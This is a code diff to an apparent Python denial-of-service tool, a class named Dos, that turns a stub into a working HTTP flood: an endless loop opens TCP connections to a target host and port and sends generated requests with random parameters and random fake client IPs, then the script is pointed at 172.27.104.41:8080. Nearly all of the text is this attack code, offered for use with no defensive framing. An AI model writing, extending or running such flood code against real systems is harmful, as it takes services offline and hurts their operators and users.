@@ -3,6 +3,8 @@ import random
 import json
 import os
 import string
+import time
+from utils import color_text
 from threading import Thread
 
 TCP = socket.SOCK_STREAM
@@ -31,7 +33,19 @@ class Dos():
         """
         HTTP(S) flood
         """
-        sock = socket.socket(socket.AF_INET, TCP)
+        color_text('green', '[+] Connect to send request ...')
+        time.sleep(1)
+        color_text('yellow', '[+] Start sending')
+        i = 0
+        while True:
+            sock = socket.socket(socket.AF_INET, TCP)
+            sock.connect((self.target_ip, self.target_port))
+            sock.send(self.get_http_request())
+            sock.close()
+            i += 1
+
+            if (i != 0 and i % 10000 == 0):
+                print(f'{i} request send !')
 
     def get_http_request(self):
         random_ip = self.http_random_ip()
@@ -51,8 +65,8 @@ class Dos():
         header += 'Pragma: no-cache\r\n'
         header += 'Cache-Control: no-cache\r\n'
         header += '\r\n\r\n'
-        return header
-    
+        return header.encode()
+
     def post_http_request(self):
         random_ip = self.http_random_ip()
         header = f"POST /{self.http_random_resource()}?{self.http_random_param()} HTTP/1.1\r\n"
@@ -83,14 +97,16 @@ class Dos():
 
     def http_random_param(self):
         """Generate a random GET parameter and value"""
-        param = ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 10)))
-        value = ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 10)))
+        param = ''.join(random.choices(
+            string.ascii_lowercase, k=random.randint(2, 10)))
+        value = ''.join(random.choices(
+            string.ascii_lowercase, k=random.randint(2, 10)))
         return f"{param}={value}"
 
     def http_random_ip(self):
         """Generate a random ip"""
         return ".".join(str(random.randint(15, 220)) for _ in range(4))
-    
+
     def http_random_resource(self):
         """Generate random resource"""
         return ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
@@ -110,5 +126,6 @@ class Dos():
                 print('Bad method')
                 return
 
-dos = Dos("toto.com", 443, 'https')
-print(dos.post_http_request())
+
+dos = Dos("172.27.104.41", 8080, 'http')
+print(dos.http_flood())
